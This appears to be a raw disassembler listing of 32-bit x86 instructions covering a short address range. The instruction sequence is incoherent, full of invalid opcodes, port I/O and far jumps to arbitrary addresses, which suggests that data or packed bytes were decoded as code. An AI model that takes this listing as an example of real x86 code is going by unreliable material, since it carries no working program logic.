  434b0b:	mov    ds:0xa34a8f3f,al
  434b10:	call   0x5262:0xd4a1702b
  434b17:	outs   dx,BYTE PTR ds:[esi]
  434b18:	pop    ecx
  434b19:	in     al,dx
  434b1a:	(bad)  
  434b1b:	jno    0x434aa3
  434b1d:	ud0    esp,DWORD PTR [ecx]
  434b20:	pop    ds
  434b21:	out    0x2e,al
  434b23:	loop   0x434b99
  434b25:	jbe    0x434ad3
  434b27:	nop
  434b28:	pop    es
  434b29:	inc    esp
  434b2a:	repnz aas 
  434b2c:	inc    eax
  434b2d:	mov    eax,ds:0xa93497d8
  434b32:	dec    ecx
  434b33:	xchg   edi,eax
  434b34:	pop    esi
  434b35:	iret   
  434b36:	test   eax,0x6af35f42
  434b3b:	sub    bh,BYTE PTR [eax]
  434b3d:	popa   
  434b3e:	mov    esi,0x77da3135
  434b43:	adc    al,0x5b
  434b45:	mov    edx,0x4544fdee
  434b4a:	loopne 0x434b2c
  434b4c:	inc    ebx
  434b4d:	jmp    0x1462eb14
  434b52:	xor    BYTE PTR [edi+0x4db23dbe],dl
  434b58:	retf   
  434b59:	(bad)  
  434b5a:	out    dx,al
  434b5b:	lods   eax,DWORD PTR ds:[esi]
  434b5c:	repz adc al,bl
  434b5f:	call   0xa03dc14d
  434b64:	xchg   esi,eax
  434b65:	fist   DWORD PTR ds:0x5e9e316e
  434b6b:	ds ret 
  434b6d:	dec    ebx
  434b6e:	pop    esi
  434b6f:	xchg   esp,eax
  434b70:	pop    esp
  434b71:	xor    dh,ch
  434b73:	aad    0xe0
  434b75:	outs   dx,BYTE PTR ds:[esi]
  434b76:	call   0xc2a1:0x892556d4
  434b7d:	leave  
  434b7e:	dec    ecx
  434b7f:	gs repz retfw 
  434b83:	rcr    DWORD PTR [esi-0x33],0x8b
  434b87:	arpl   WORD PTR [ecx],di
  434b89:	fcomi  st,st(6)
  434b8b:	ds mov bh,0x60
  434b8e:	aas    
  434b8f:	rcr    BYTE PTR [ebx-0x7f],1
  434b92:	iret   
  434b93:	sub    BYTE PTR [esi-0x4d73116b],0xa4
  434b9a:	scas   eax,DWORD PTR es:[edi]
  434b9b:	mov    al,0x60
  434b9d:	call   0xc71aec56
  434ba2:	ins    BYTE PTR es:[edi],dx
  434ba3:	es imul edi,esi,0xffffffc6
  434ba7:	outs   dx,BYTE PTR ds:[esi]
  434ba8:	xor    DWORD PTR [di+0x3b],ebp
  434bac:	jle    0x434b8e
  434bae:	aaa    
  434baf:	push   cs
  434bb0:	aam    0x31
  434bb2:	dec    eax
  434bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434bb4:	pusha  
  434bb5:	or     DWORD PTR [ebx-0x69664408],0xeb0ea2c7
  434bbf:	icebp  
  434bc0:	xchg   edi,eax
  434bc1:	ja     0x434bcd
  434bc3:	(bad)  
  434bc4:	push   ds
  434bc5:	pop    esi
  434bc6:	ret    0xb143
  434bc9:	mov    edx,DWORD PTR [edi+ebp*4+0x26665e6e]
  434bd0:	pop    esi
  434bd1:	push   esp
  434bd2:	cld    
  434bd3:	mov    eax,0xade11a83
  434bd8:	add    al,0x61
  434bda:	div    BYTE PTR [esi+0x78b35028]
  434be0:	aad    0x29
  434be2:	in     eax,dx
  434be3:	mov    ebx,0xfef3ca2
  434be8:	lahf   
  434be9:	sub    ah,BYTE PTR [esi-0x46]
  434bec:	adc    al,0x60
  434bee:	lock sbb BYTE PTR [ecx+0x47],ch
  434bf2:	inc    edx
  434bf3:	push   0xffffffe2
  434bf5:	mov    eax,0x324cc919
  434bfa:	and    al,0x2c
  434bfc:	pop    esi
  434bfd:	add    DWORD PTR [edx-0x3e],ecx
  434c00:	lea    edx,[ebx-0x215c5e79]
  434c06:	mov    esi,0xaa32f9f2
  434c0b:	das    
  434c0c:	pop    esi
  434c0d:	cmp    BYTE PTR [edx+0x28],cl
  434c10:	mov    al,0x55
  434c12:	add    ah,BYTE PTR [eax+0x3056125]
  434c18:	dec    eax
  434c19:	dec    edi
  434c1a:	cmp    al,0x39
  434c1c:	in     al,dx
  434c1d:	push   cs
  434c1e:	lock xchg DWORD PTR [ecx-0x28],ebx
  434c22:	adc    BYTE PTR [ecx-0x193b55fe],al
  434c28:	push   es
  434c29:	popa   
  434c2a:	cli    
  434c2b:	xchg   esi,eax
  434c2c:	jle    0x434bf3
  434c2e:	(bad)  
  434c2f:	mov    ebp,0x6feebb0a
  434c34:	fst    DWORD PTR [ebp-0x3449a08b]
  434c3a:	sbb    al,0xa1
  434c3c:	cmc    
  434c3d:	and    ebx,ebx
  434c3f:	ss into 
  434c41:	rcr    BYTE PTR [ecx-0x38],0x5e
  434c45:	push   es
  434c46:	pop    ebp
  434c47:	aad    0x0
  434c49:	cwde   
  434c4a:	mov    esi,0x81609264
  434c4f:	cli    
  434c50:	mov    ebp,ebx
  434c52:	popa   
  434c53:	stos   DWORD PTR es:[edi],eax
  434c54:	mov    eax,0x513feeff
  434c59:	push   cs
  434c5a:	call   0x2fa1:0x5800e972
  434c61:	pop    edi
  434c62:	outs   dx,DWORD PTR ds:[esi]
  434c63:	xchg   DWORD PTR [esi],edx
  434c65:	les    esi,FWORD PTR [edx]
  434c67:	push   edx
  434c68:	in     al,dx
  434c69:	add    ebp,esi
  434c6b:	cmp    bl,BYTE PTR [ebx-0x5c]
  434c6e:	clc    
  434c6f:	xor    al,0x52
  434c71:	jecxz  0x434c44
  434c73:	(bad)  
  434c74:	rdpmc  
  434c76:	pop    ecx
  434c77:	mov    eax,ds:0xf2a58536
  434c7c:	ins    DWORD PTR es:[edi],dx
  434c7d:	sbb    al,0xee
  434c7f:	bt     esp,esp
  434c82:	mov    eax,edx
  434c84:	push   ds
  434c85:	jge    0x434ced
  434c87:	mov    eax,ds:0x94eb1b14
  434c8c:	mov    bh,0xf3
  434c8e:	shr    DWORD PTR [edx-0x4d18a0a0],1
  434c94:	icebp  
  434c95:	fist   WORD PTR [esi+edx*8]
  434c98:	fiadd  WORD PTR [edi]
  434c9a:	adc    eax,0xe10e8181
  434c9f:	aad    0x5e
  434ca1:	out    dx,al
  434ca2:	jbe    0x434ce7
  434ca4:	retf   0x6e8f
  434ca7:	fbld   TBYTE PTR [eax+0x1]
  434cab:	mov    cl,0x26
  434cad:	ficomp DWORD PTR [edx]
  434caf:	out    0xc9,eax
  434cb1:	cmc    
  434cb2:	out    dx,al
  434cb3:	xchg   edi,eax
  434cb4:	xor    DWORD PTR [ebp+0x8b96429],eax
  434cba:	xor    BYTE PTR [ecx+0x545e88e6],ah
  434cc0:	inc    esi
  434cc1:	es test eax,0x28755e81
  434cc7:	adc    eax,0x3fa13cbc
  434ccc:	daa    
  434ccd:	popa   
  434cce:	repz fbld TBYTE PTR [eax+0x2c]
  434cd2:	push   0xffffffd9
  434cd4:	dec    edi
  434cd5:	loopne 0x434ce7
  434cd7:	add    edi,DWORD PTR [edx]
  434cd9:	adc    ebp,esp
  434cdb:	mov    edi,0xe187d7d4
  434ce0:	das    
  434ce1:	imul   esp,edi,0x51b54ba0
  434ce7:	xchg   DWORD PTR [edx+0x56392e1b],esi
  434ced:	neg    BYTE PTR [eax]
  434cef:	adc    al,0x64
  434cf1:	sbb    DWORD PTR [edx],esi
  434cf3:	mov    eax,ds:0x193ecf83
  434cf8:	and    ecx,DWORD PTR [ebp-0x1f]
  434cfb:	neg    DWORD PTR [esi+0xa]
  434cfe:	jg     0x434c94
  434d00:	xor    DWORD PTR ds:0x72ef6d47,ebp
  434d06:	jno    0x434d5c
  434d08:	mov    bh,0x59
  434d0a:	(bad)  
  434d0c:	and    eax,0x19b04931
  434d11:	ins    BYTE PTR es:[edi],dx
  434d12:	out    dx,al
  434d13:	popf   
  434d14:	lahf   
  434d15:	rcl    DWORD PTR [ebp+0x6259b23b],1
  434d1b:	mov    ss,WORD PTR [eax-0x321e7dc6]
  434d21:	xchg   edx,eax
  434d22:	pop    esi
  434d23:	jns    0x434d0b
  434d25:	or     al,0xee
  434d27:	push   esi
  434d28:	jne    0x434d6d
  434d2a:	stos   DWORD PTR es:[edi],eax
  434d2b:	into   
  434d2c:	xchg   edi,eax
  434d2d:	jo     0x434d56
  434d2f:	lahf   
  434d30:	lahf   
  434d31:	lods   eax,DWORD PTR ds:[esi]
  434d32:	xor    eax,DWORD PTR [ebp+0x7e]
  434d35:	aad    0x84
  434d37:	inc    esp
  434d38:	shr    BYTE PTR [ecx-0x12],1
  434d3b:	adc    esi,DWORD PTR [ecx+eax*1-0x68541468]
  434d42:	sbb    DWORD PTR [edi+ebp*8+0x5e4f95e6],0x72
  434d4a:	xchg   BYTE PTR [ebx+eax*1+0x1e96eefc],al
  434d51:	push   ebx
  434d52:	out    0xcb,al
  434d54:	ficomp DWORD PTR [ecx+0x4c]
  434d57:	mov    eax,ds:0x2b596568
  434d5c:	in     eax,dx
  434d5d:	stc    
  434d5e:	xlat   BYTE PTR ds:[ebx]
  434d5f:	mov    dh,0x5e
  434d61:	push   si
  434d63:	hlt    
  434d64:	sbb    DWORD PTR [edx+0x73],0x71
  434d68:	aam    0x60
  434d6a:	jl     0x434d3e
  434d6c:	test   eax,0xabc29092
  434d71:	jnp    0x434d59
  434d73:	mov    eax,ds:0x4d9b6d5e
  434d78:	xlat   BYTE PTR ds:[ebx]
  434d79:	call   0x6c26:0x614925f2
  434d80:	outs   dx,DWORD PTR ds:[esi]
  434d81:	repz mov esi,ebx
  434d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434d85:	sbb    ebp,esi
  434d87:	jne    0x434d1a
  434d89:	and    BYTE PTR [esi+0x73],0x9
  434d8d:	je     0x434d8f
  434d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434d90:	adc    BYTE PTR [eax],0x24
  434d93:	or     al,0x40
  434d95:	cmp    al,0xa6
  434d97:	jg     0x434df0
  434d99:	jmp    0xdf2c:0xf11127ee
  434da0:	jle    0x434da6
  434da2:	rcl    BYTE PTR [eax],0xc9
  434da5:	push   edx
  434da6:	fucomip st,st(4)
  434da8:	add    eax,0xe8aa6e63
  434dad:	jbe    0x434d47
  434daf:	lods   al,BYTE PTR ds:[esi]
  434db0:	pop    esi
  434db1:	mov    ds:0x77761d53,eax
  434db6:	stc    
  434db7:	cmp    al,0xd2
  434db9:	pop    ecx
  434dba:	push   ebp
  434dbb:	dec    ecx
  434dbc:	aad    0xc9
  434dbe:	mov    DWORD PTR [ecx],eax
  434dc0:	inc    esi
  434dc1:	je     0x434dd0
  434dc3:	mov    ebp,0xd09b7e5b
  434dc8:	out    dx,al
  434dc9:	jle    0x434e1a
  434dcb:	loope  0x434d96
  434dcd:	and    DWORD PTR [eax-0x18a1faf5],edi
  434dd3:	sub    ebx,DWORD PTR [edx+ebp*4]
  434dd6:	test   DWORD PTR [edx-0x29],0xd05c2e73
  434ddd:	hlt    
  434dde:	out    dx,al
  434ddf:	jp     0x434d82
  434de1:	nop
  434de2:	jne    0x434e1a
  434de4:	sbb    bh,BYTE PTR [eax]
  434de6:	inc    ecx
  434de7:	fwait
  434de8:	jae    0x434e3e
  434dea:	call   DWORD PTR [ebp+0x6b]
  434ded:	pop    ecx
  434dee:	add    eax,0xd2d15f5b
  434df3:	sub    esp,DWORD PTR [esi+0x2a]
  434df6:	out    dx,al
  434df7:	mov    WORD PTR [edx-0x5c1197d5],?
  434dfd:	ins    BYTE PTR es:[edi],dx
  434dfe:	js     0x434dec
  434e00:	jmp    DWORD PTR [eax+0x1]
  434e03:	fcomp  QWORD PTR [eax+edi*2+0x6697a41f]
  434e0a:	in     eax,dx
  434e0b:	fwait
  434e0c:	xchg   ecx,ebx
  434e0e:	xchg   edi,eax
  434e0f:	cmp    DWORD PTR [eax],esp
  434e11:	ins    DWORD PTR es:[edi],dx
  434e12:	cmp    ch,BYTE PTR [edi]
  434e14:	sbb    ah,BYTE PTR [ecx+0xa]
  434e17:	mov    ds,WORD PTR [esp+edi*1+0x32]
  434e1b:	sub    DWORD PTR [ebx+ecx*1-0x20],ebp
  434e1f:	stc    
  434e20:	pop    esi
  434e21:	sti    
  434e22:	fst    DWORD PTR [esp+ecx*4-0x28692824]
  434e29:	pop    ebx
  434e2a:	in     eax,dx
  434e2b:	jno    0x434e9e
  434e2d:	push   cs
  434e2e:	mov    esp,DWORD PTR [ebp+edi*8-0x6e]
  434e32:	(bad)  
  434e33:	push   ecx
  434e34:	retf   
  434e35:	lods   al,BYTE PTR ds:[esi]
  434e36:	call   0xdd84ace7
  434e3b:	fisubr DWORD PTR [ecx]
  434e3d:	inc    ebx
  434e3e:	ficomp WORD PTR [eax+0x69]
  434e41:	pop    edi
  434e42:	ds push 0x14eb6b0d
  434e48:	adc    DWORD PTR [ecx],esi
  434e4a:	pop    edi
  434e4b:	cld    
  434e4c:	pop    esi
  434e4d:	lea    esi,[eax]
  434e4f:	ins    DWORD PTR es:[edi],dx
  434e50:	pusha  
  434e51:	add    edi,DWORD PTR ds:0x375a4361
  434e57:	push   eax
  434e58:	or     al,0xdb
  434e5a:	(bad)  
  434e5b:	shl    BYTE PTR [ebx+0x5e29bbb1],0x87
  434e62:	ret    0xa9fa
  434e65:	fadd   st,st(6)
  434e67:	cwde   
  434e68:	shl    DWORD PTR [ecx+0x5d],0x18
  434e6c:	mov    ah,0xb7
  434e6e:	outs   dx,BYTE PTR ds:[esi]
  434e6f:	sub    al,0x19
  434e71:	pusha  
  434e72:	mov    ds,WORD PTR [ebx-0x7bdac343]
  434e78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434e79:	loopne 0x434eb2
  434e7b:	dec    ebp
  434e7c:	repnz push 0x5e5b11e0
  434e82:	rcr    ecx,cl
  434e84:	stc    
  434e85:	sub    bl,bh
  434e87:	lock sahf 
  434e89:	jge    0x434e38
  434e8b:	cwde   
  434e8c:	pop    esi
  434e8d:	(bad)  
  434e8e:	cld    
  434e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434e90:	mov    esi,DWORD PTR [edi-0x39]
  434e93:	fbstp  TBYTE PTR [esi]
  434e95:	popa   
  434e96:	mov    gs,edi
  434e98:	xchg   al,ah
  434e9a:	jg     0x434e4e
  434e9c:	mov    ebp,0x3dbf0026
  434ea1:	shr    DWORD PTR [esi+0x29],1
  434ea4:	dec    edi
  434ea5:	push   esp
  434ea6:	lahf   
  434ea7:	iret   
  434ea8:	mov    al,ds:0x94a18fc8
  434ead:	sub    al,0x8a
  434eaf:	test   DWORD PTR [esi-0x3e],esi
  434eb2:	mov    esp,0xe796f2b4
  434eb7:	jg     0x434e7a
  434eb9:	add    BYTE PTR [edx-0x1dc3c1bf],bh
  434ebf:	pop    ebx
  434ec0:	push   ds
  434ec1:	mov    eax,ds:0x34d02b7c
  434ec6:	sub    dl,BYTE PTR [esi+ebp*1]
  434ec9:	scas   al,BYTE PTR es:[edi]
  434eca:	dec    edx
  434ecb:	xchg   edx,ebp
  434ecd:	xor    dl,cl
  434ecf:	mov    eax,ds:0xfdce442a
  434ed4:	xchg   esi,eax
  434ed5:	jl     0x434e74
  434ed7:	mov    cl,0x17
  434ed9:	sub    dh,0x3
  434edc:	das    
  434edd:	test   eax,0x250538e8
  434ee2:	jp     0x434e83
  434ee4:	aam    0x3b
  434ee6:	ins    BYTE PTR es:[edi],dx
  434ee7:	inc    ebp
  434ee8:	mov    esi,0xe56ade8d
  434eed:	inc    esp
  434eee:	lock repnz push ds
  434ef1:	adc    DWORD PTR [ecx+eax*2-0x7d],edi
  434ef5:	push   ecx
  434ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434ef7:	mov    BYTE PTR [edx-0xb602c44],0x96
  434efe:	xchg   esp,eax
  434eff:	dec    ebx
  434f00:	pop    esi
  434f01:	imul   ebp,DWORD PTR [edi],0xee78fee6
  434f07:	mov    ds:0x71252789,eax
  434f0c:	in     eax,dx
  434f0d:	pop    ecx
  434f0e:	jns    0x434eb1
  434f10:	dec    ebx
  434f11:	jge    0x434f65
  434f13:	jecxz  0x434f09
  434f15:	cmp    eax,0x3a7ce3ea
  434f1a:	in     al,dx
  434f1b:	jbe    0x434f30
  434f1d:	inc    esp
  434f1e:	fsub   QWORD PTR [eax]
  434f20:	in     eax,dx
  434f21:	and    BYTE PTR [ecx],cl
  434f23:	or     ecx,DWORD PTR [eax]
  434f25:	das    
  434f26:	mov    BYTE PTR [ecx+0x3b654c00],ah
  434f2c:	int3   
  434f2d:	arpl   WORD PTR [eax+edi*8+0x2449c65e],di
  434f34:	bound  ebp,QWORD PTR [esi+0x60746bb4]
  434f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434f3b:	pop    edi
  434f3c:	retf   
  434f3d:	jmp    0x434f85
  434f3f:	icebp  
  434f40:	(bad)  
  434f41:	dec    esi
  434f42:	out    dx,al
  434f43:	mov    WORD PTR [ebx+0x84a14f],ds
  434f49:	out    0x3b,al
  434f4b:	lahf   
  434f4c:	gs jnp 0x434ee9
  434f4f:	out    0x7b,al
  434f51:	push   ss
  434f52:	sbb    al,0xe4
  434f54:	data16 xor ch,0x60
  434f58:	cmp    BYTE PTR ds:[ebp-0x5f],bh
  434f5c:	mov    edi,0x3407574f
  434f61:	jae    0x434f23
  434f63:	xchg   DWORD PTR [edx-0x8df28bd],ebp
  434f69:	mov    edi,0x34e48ce8
  434f6e:	out    dx,al
  434f6f:	adc    eax,0x79b6f893
  434f74:	cwde   
  434f75:	jns    0x434fe2
  434f77:	mov    eax,ds:0x5151822
  434f7c:	fst    DWORD PTR [eax+0x235d977c]
  434f82:	pusha  
  434f83:	das    
  434f84:	xchg   esp,eax
  434f85:	mov    ch,0xbb
  434f87:	pop    ecx
  434f88:	jnp    0x434f49
  434f8a:	mov    ds:0x24959a0c,al
  434f8f:	mov    eax,ds:0x9f04d57c
  434f94:	mov    bl,0xf6
  434f96:	pushf  
  434f97:	clc    
  434f98:	pop    esi
  434f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434f9a:	mov    ah,0x77
  434f9c:	into   
  434f9d:	mov    dh,0xba
  434f9f:	dec    ebx
  434fa0:	dec    ebx
  434fa1:	fs repz daa 
  434fa4:	push   ss
  434fa5:	test   ah,bh
  434fa7:	jg     0x434f3b
  434fa9:	pusha  
  434faa:	gs mov dh,0xca
  434fad:	push   0xc363c794
  434fb2:	stos   DWORD PTR es:[edi],eax
  434fb3:	clc    
  434fb4:	fadd   QWORD PTR [eax+0x4359ad23]
  434fba:	out    0x84,eax
  434fbc:	mov    ecx,0x44649a4e
  434fc1:	popa   
  434fc2:	repz jo 0x434fd2
  434fc5:	mov    al,0x63
  434fc7:	add    cl,BYTE PTR [eax+edi*1+0x42]
  434fcb:	push   edi
  434fcc:	pop    edi
  434fcd:	(bad)  
  434fce:	adc    eax,0x61e95b69
  434fd3:	out    dx,eax
  434fd4:	lods   al,BYTE PTR ds:[esi]
  434fd5:	pop    esi
  434fd6:	mov    al,ds:0x71bb90d8
  434fdb:	lahf   
  434fdc:	dec    cl
  434fde:	pop    edi
  434fdf:	mov    DWORD PTR [esi+0x55],ebx
  434fe2:	push   esp
  434fe3:	loope  0x435055
  434fe5:	aad    0x72
  434fe7:	icebp  
  434fe8:	dec    edi
  434fe9:	pop    edx
  434fea:	mov    edx,0x499fc406
  434fef:	popa   
  434ff0:	jmp    0x5ef38d78
  434ff5:	aaa    
  434ff6:	or     ebp,DWORD PTR [esi+0xd]
  434ff9:	mov    DWORD PTR [esi],esp
  434ffb:	mov    al,ds:0x4257609f
  435000:	jmp    0xe801:0x68150816
  435007:	popf   
  435008:	stos   DWORD PTR es:[edi],eax
  435009:	shl    ch,cl
  43500b:	out    0xc5,eax
  43500d:	pusha  
  43500e:	inc    ecx
  43500f:	jno    0x435078
  435011:	cmp    eax,edx
  435013:	mov    al,ds:0x2d953713
  435018:	js     0x434fe1
  43501a:	cmp    edi,edi
  43501c:	pop    esi
  43501d:	mov    ebp,0xb9c1307a
  435022:	push   ss
  435023:	in     al,0x4c
  435025:	fs loop 0x434fe6
  435028:	arpl   ax,ax
  43502a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43502b:	out    dx,al
  43502c:	mov    esi,0x138f54c8
  435031:	fist   DWORD PTR [edx]
  435033:	leave  
  435034:	gs (bad) 
  435036:	hlt    
  435037:	xlat   BYTE PTR ds:[ebx]
  435038:	cmp    al,0xf0
  43503b:	call   0x59315b88
  435040:	or     al,0x6a
  435042:	push   edi
  435043:	pop    edx
  435044:	xchg   ebp,eax
  435045:	and    al,0x2f
  435047:	mov    eax,ds:0x6dbb2b5
  43504c:	sbb    eax,0x638cd347
  435051:	mov    ch,0xc6
  435053:	fcmovnbe st,st(2)
  435055:	inc    ebx
  435056:	mov    ebx,0x57005e90
  43505b:	mov    esp,0xa117a00a
  435060:	int3   
  435061:	xor    edx,edi
  435063:	lahf   
  435064:	add    bl,BYTE PTR [ebp+edi*8+0x41]
  435068:	pop    esi
  435069:	nop
  43506a:	nop    DWORD PTR [ecx]
  43506d:	sub    al,0x25
  43506f:	jbe    0x435008
  435071:	pusha  
  435072:	inc    ecx
  435073:	jge    0x43507c
  435075:	cli    
  435076:	in     al,0xe1
  435078:	mov    eax,ds:0x1751fc1
  43507d:	popa   
  43507e:	in     eax,dx
  43507f:	outs   dx,DWORD PTR ds:[esi]
  435080:	das    
  435081:	rcr    bl,1
  435083:	xchg   esi,eax
  435084:	and    dh,BYTE PTR [ecx]
  435086:	stos   BYTE PTR es:[edi],al
  435087:	out    dx,al
  435088:	out    0x5f,al
  43508a:	xchg   ebx,eax
  43508b:	dec    ebx
  43508c:	popa   
  43508d:	xchg   edi,eax
  43508e:	sbb    DWORD PTR [edx-0x7b],esi
  435091:	sub    al,0xaa
  435094:	pop    esi
  435095:	shl    dl,cl
  435097:	(bad)  
  435098:	mov    ch,0x71
  43509a:	mov    ah,0x12
  43509c:	xor    DWORD PTR [ebx+0xc5a144],esp
  4350a2:	int    0x62
  4350a4:	adc    eax,0x5e3cdc5a
  4350a9:	adc    BYTE PTR [eax+0x6e77c94c],bl
  4350af:	jmp    0x6209b815
  4350b4:	pop    esi
  4350b5:	clc    
  4350b6:	sbb    al,BYTE PTR [eax-0x9]
  4350b9:	test   al,0x8e
  4350bb:	pop    eax
  4350bc:	pop    esi
  4350bd:	mov    edx,0x6e22a242
  4350c2:	dec    ebp
  4350c3:	call   0xac00:0x2a736163
  4350ca:	and    al,0x6a
  4350cc:	mov    ecx,0xc20cee1a
  4350d1:	xchg   esp,eax
  4350d2:	pop    es
  4350d3:	repnz sti 
  4350d5:	inc    ebx
  4350d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4350d7:	mov    al,ds:0x4398e09d
  4350dc:	iret   
  4350dd:	aaa    
  4350de:	add    BYTE PTR [ecx+0x64],al
  4350e1:	adc    al,0xb2
  4350e3:	mov    dh,0xca
  4350e5:	pusha  
  4350e6:	dec    ebx
  4350e7:	and    edx,edx
  4350e9:	cmp    dh,bl
  4350eb:	mov    al,ds:0xe3cd2013
  4350f0:	out    0xdb,al
  4350f2:	mov    bl,0x2f
  4350f4:	pop    esi
  4350f5:	aas    
  4350f6:	dec    ecx
  4350f7:	ret    
  4350f8:	pop    edx
  4350f9:	fs ins DWORD PTR es:[edi],dx
  4350fb:	mov    esi,0x5def6159
  435100:	push   esi
  435101:	int3   
  435102:	xchg   esi,eax
  435103:	mov    al,dl
  435105:	out    dx,eax
  435106:	out    dx,al
  435107:	dec    eax
  435108:	call   0x1163:0x7862c77
  43510f:	mov    eax,ds:0xd9a88330
  435114:	xchg   ecx,eax
  435115:	(bad)  
  435117:	mov    esi,0xd2fca5e
  43511c:	cmp    eax,0xdef1e7db
  435121:	pusha  
  435122:	cmp    DWORD PTR [edx],0x1e
  435125:	mov    edx,0xec69c956
  43512a:	out    dx,eax
  43512b:	adc    eax,DWORD PTR [esi]
  43512d:	aaa    
  43512e:	push   edi
  43512f:	inc    ecx
  435130:	mov    dl,0x9d
  435132:	imul   ecx,DWORD PTR [edx],0x3c150555
  435138:	pop    edi
  435139:	daa    
  43513a:	cmp    DWORD PTR [edx],eax
  43513c:	pop    esp
  43513d:	std    
  43513e:	mov    ds,WORD PTR ds:0xa8ee1ba0
  435144:	dec    eax
  435145:	int    0x9a
  435147:	in     eax,dx
  435148:	adc    eax,0x45a16c32
  43514d:	xchg   dl,cl
  43514f:	sbb    bh,BYTE PTR [ebp+0x1e]
  435152:	push   0x6c
  435154:	je     0x43519d
  435156:	add    dl,bl
  435158:	adc    DWORD PTR [edx+0x6e],0x7901c353
  43515f:	push   0xb05b60ed
  435164:	cli    
  435165:	xlat   BYTE PTR ds:[ebx]
  435166:	or     DWORD PTR [ebx],esi
  435168:	fdivrp st(2),st
  43516a:	out    0x33,eax
  43516c:	dec    ecx
  43516d:	int    0xdb
  43516f:	lods   al,BYTE PTR ds:[esi]
  435170:	sahf   
  435171:	and    dh,bh
  435173:	fdiv   QWORD PTR [eax+eiz*2+0x76]
  435177:	add    edi,edx
  435179:	pop    edi
  43517a:	mov    ch,0xea
  43517c:	mov    bl,0x4
  43517e:	out    dx,al
  43517f:	js     0x435146
  435181:	lods   al,BYTE PTR ds:[esi]
  435182:	xchg   ecx,eax
  435183:	mov    al,0x62
  435185:	mov    edi,0x5e69009
  43518a:	ins    BYTE PTR es:[edi],dx
  43518b:	mov    eax,ds:0x2764ac0f
  435190:	pusha  
  435191:	imul   ebp,esi,0xffffff8a
  435194:	shl    BYTE PTR [edi+0x1d3fec1b],0xc
  43519b:	neg    DWORD PTR ds:0x6b2d4e61
  4351a1:	aad    0xac
  4351a3:	push   es
  4351a4:	sub    edi,ecx
  4351a6:	fdivr  QWORD PTR [eax]
  4351a8:	outs   dx,BYTE PTR ds:[esi]
  4351a9:	(bad)  
  4351aa:	out    dx,al
  4351ab:	int3   
  4351ac:	popa   
  4351ad:	std    
  4351ae:	push   ds
  4351af:	jnp    0x43514e
  4351b1:	or     DWORD PTR ds:0xa04d8ea1,eax
  4351b7:	mov    bh,0xe3
  4351b9:	xchg   edx,eax
  4351ba:	dec    DWORD PTR [ecx+ebp*2-0x68]
  4351be:	sahf   
  4351bf:	mov    ch,0x5e
  4351c1:	stos   DWORD PTR es:[edi],eax
  4351c2:	dec    ebp
  4351c3:	dec    edi
  4351c4:	push   ebp
  4351c5:	mov    esi,0x60ccbcef
  4351ca:	mov    eax,DWORD PTR [esi-0x71]
  4351cd:	es jmp 0xee552d44
  4351d3:	out    0x78,eax
  4351d5:	or     eax,0xe877ccc6
  4351da:	inc    edi
  4351db:	mov    eax,ds:0x9ae88457
  4351e0:	div    esi
  4351e2:	jp     0x43520a
  4351e4:	pop    esi
  4351e5:	mov    ds:0xd7579a1,al
  4351ea:	cwde   
  4351eb:	inc    edx
  4351ec:	test   DWORD PTR [eax-0x4f],esp
  4351ef:	outs   dx,BYTE PTR ds:[esi]
  4351f0:	xor    eax,0x9c30677c
  4351f5:	jle    0x4351f2
  4351f7:	int    0xd5
  4351f9:	stos   DWORD PTR es:[edi],eax
  4351fa:	out    dx,al
  4351fb:	dec    esi
  4351fc:	mov    edi,DWORD PTR [edi]
  4351fe:	xchg   ecx,eax
  4351ff:	int3   
  435200:	jbe    0x435262
  435202:	call   FWORD PTR [edx+0x3547e79a]
  435208:	test   DWORD PTR [edx],edi
  43520a:	jmp    0x435237
  43520c:	inc    ecx
  43520d:	mov    esi,DWORD PTR [ebp+edx*1-0x5d]
  435211:	(bad)  
  435212:	arpl   WORD PTR [ecx],ax
  435214:	and    ah,BYTE PTR [edi]
  435216:	sbb    al,0xa1
  435218:	sar    edx,1
  43521a:	sub    eax,0xe3fbe18
  43521f:	jg     0x43527f
  435221:	cld    
  435222:	sar    DWORD PTR [edi+eax*2-0x22],cl
  435226:	xor    BYTE PTR [ecx+edx*4],0x60
  43522a:	(bad)  
  43522b:	es xor al,0x19
  43522e:	fcomp  st(4)
  435230:	fsub   DWORD PTR [esi+ebp*8+0x50]
  435234:	mov    dh,0x26
  435236:	into   
  435237:	out    0x65,eax
  435239:	mov    ds,WORD PTR [ebp-0x6ff89e5f]
  43523f:	mov    ds:0xb3487b7,eax
  435244:	pop    esi
  435245:	jbe    0x435231
  435247:	sbb    dl,BYTE PTR [ebp-0x46]
  43524a:	into   
  43524b:	retf   
  43524c:	lahf   
  43524d:	pusha  
  43524e:	and    eax,0x4665ad68
  435253:	push   cs
  435254:	push   cs
  435255:	ins    BYTE PTR es:[edi],dx
  435256:	out    dx,al
  435257:	pop    bx
  435259:	xor    al,0xe6
  43525b:	enter  0x8176,0x0
  43525f:	mov    eax,ds:0x70aa4564
  435264:	push   eax
  435265:	loope  0x435243
  435267:	lea    ebx,[ebp-0x61]
  43526a:	ds nop
  43526c:	ds aaa 
  43526e:	pop    eax
  43526f:	mov    ebx,DWORD PTR [edx]
  435271:	mov    ch,BYTE PTR [ebx-0x6e]
  435274:	xchg   edi,eax
  435275:	cwde   
  435276:	adc    al,0x19
  435278:	punpcklbw mm7,DWORD PTR [esp+ebx*1+0x17e9a454]
  435280:	jl     0x4352c2
  435282:	push   es
  435283:	mov    al,ds:0x214a8b31
  435288:	dec    ebp
  435289:	and    cl,BYTE PTR [ecx+0x74034fe6]
  43528f:	test   al,0xdf
  435291:	lds    edx,FWORD PTR [esi-0xf302c63]
  435297:	adc    al,0x48
  435299:	sahf   
  43529a:	xlat   BYTE PTR ds:[ebx]
  43529b:	clc    
  43529c:	pop    ebx
  43529d:	pmaxub mm3,QWORD PTR [eax+0x3e9eafbe]
  4352a4:	std    
  4352a5:	add    al,0xf4
  4352a7:	mov    al,ds:0xa2d32bdd
  4352ac:	out    0x1c,al
  4352ae:	jae    0x4352fd
